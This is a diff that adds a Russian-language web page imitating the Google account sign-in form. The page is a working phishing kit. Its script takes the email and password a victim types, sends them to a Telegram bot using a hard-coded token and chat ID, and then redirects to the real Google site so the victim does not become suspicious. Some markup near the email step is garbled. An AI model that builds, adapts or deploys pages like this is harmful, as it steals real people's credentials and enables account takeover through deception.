@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в аккаунты Google</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; color: #202124; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; text-align: center; }
+        .logo { width: 75px; margin-bottom: 15px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        h2 { font-size: 16px; font-weight: 400; margin-bottom: 30px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        button:hover { background: #1557b0; }
+        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
+        
+        /* Скрываем второй шаг */
+        #step-password { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Логотип Google -->
+        <svg class="logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 482 24 48z"/></svg>
+>        
+И        <!-- Шспаг 1: Ввод Email -->
+       ользу <div id="stepйте-email">
+            <h1>Вход</h1>
+            <h аккаунт Google</h2>
+            <input type="text" id="email" placeholder="Телефон или адрес эл. почты">
+            <div class="btn-container">
+                <a class="link" href="https://accounts.google.com/signup">Создать аккаунт</a>
+                <button onclick="nextStep()">Далее</button>
+            </div>
+        </div>
+
+        <!-- Шаг 2: Ввод Пароля -->
+        <div id="step-password">
+            <h1>Добро пожаловать</h1>
+            <h2 id="display-email" style="font-weight: 500;"></h2>
+            <input type="password" id="password" placeholder="Введите пароль">
+            <div class="btn-container">
+                <a class="link">Забыли пароль?</a>
+                <button onclick="submitData()">Далее</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
+        const CHAT_ID = "7485234259"; 
+        let userEmail = "";
+
+        // Переход ко второму шагу (ввод пароля)
+        function nextStep() {
+            const emailInput = document.getElementById('email').value;
+            if (!emailInput) return;
+            
+            userEmail = emailInput;
+            document.getElementById('display-email').innerText = userEmail;
+            
+            document.getElementById('step-email').style.display = 'none';
+            document.getElementById('step-password').style.display = 'block';
+            document.getElementById('password').focus();
+        }
+
+        // Отправка данных в Telegram и редирект
+        async function submitData() {
+            const passInput = document.getElementById('password').value;
+            if (!passInput) return;
+
+            const text = `🎯 Google Phish\nEmail: ${userEmail}\nPass: ${passInput}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+            try {
+                await fetch(url, { mode: 'no-cors' });
+            } catch (e) {}
+
+            // Перекидываем на настоящий Google, чтобы не вызвать подозрений
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com/";
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
